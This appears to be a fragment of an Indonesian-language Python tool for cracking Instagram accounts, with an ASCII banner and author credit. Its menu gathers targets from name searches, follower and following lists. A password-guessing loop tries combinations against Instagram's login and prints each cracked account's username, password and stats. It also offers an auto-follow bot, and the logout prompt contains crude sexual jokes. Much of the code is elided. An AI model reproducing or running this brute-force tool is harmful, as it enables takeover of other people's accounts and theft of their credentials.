...
insta_log='https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav'
...
{H} |  __  |/ _` | '_ \ / _` / __|/ _ \| '_ ` _ \ / _ \
{H}| |  | | (_| | | | | (_| \__ \ (_) | | | | | |  __/ 
{H} |_|  |_|\__,_|_| |_|\__,_|___/\___/|_| |_| |_|\___|

{C}[*] Email       : yanzyaha@magim.be
{C}[*] Bergabung   : 25 Februari 2022
{K}[*] ---------------------------------------------
{C}[*] Kadaluwarsa : Sampai Mati
{C}[*] Status      : {H}Handsome
{C}[*] Author      : MR-HANDSOME
{K}[*] ---------------------------------------------

{M}[{C}1{C}{M}]{C} Crack Dari Pencarian Nama
{M}[{C}2{C}{M}]{C} Crack Dari Pengikut
{M}[{C}3{C}{M}]{C} Crack Dari Mengikuti
{M}[{C}4{C}{M}]{C} Crack Ulang Hasil Crack
{M}[{C}5{C}{M}]{C} Lihat Akun Hasil Crack
{M}[{C}9{C}{M}]{C} Bot Auto Follow

{M}[{C}P{C}{M}]{C} segss brutal kelly {H}(log out)
	""")

	def Exit(self):
		x=input(f'\n [{M}>{C}] Apakah anda yakin ingin segss brutal dengan kelly ? [Y/t]: ')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python instagram.py')
	...
	def passwordAPI(self,xnx):
		...
		print(f"""
 [ List kombinasi password Frifayer ]

 [1]. V1 Cepat
 [2]. V2 Lambat
 [3]. V3 Sangat Lambat {H}(recommended)
		""")
		...
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r.
  {H}[>-]{C} Status: {H} Berhasil Login🥳
  {H}[>-]{C} Nama: {H}{nama}{C}
  {H}[>-]{C} Username: {H}{user}{C}
  {H}[>-]{C} Password: {H}{pw}{C}
  {H}[>-]{C} Pengikut: {H}{pengikut}{C}
  {H}[>-]{C} Mengikuti: {H}{mengikut}{C}
  {H}[>-]{C} Postingan: {H}{postingan}{C}
					""")
  ...
  {M}[>]{C} Postingan: {M}{postingan}{C}
	...
	def menu(self):
		...
		if c=='':
			...
			z=int(input(f'\n [{U}?{C}] Masukan jumlah target: '))
			for i in range(z):
				i+1
				print(f'\n [{M}!{C}] Target harus bersifat publik jangan privat')
				m=input(f' [{M}?{C}] Masukan username instagram ({H}{len(internal)}{C}): ')
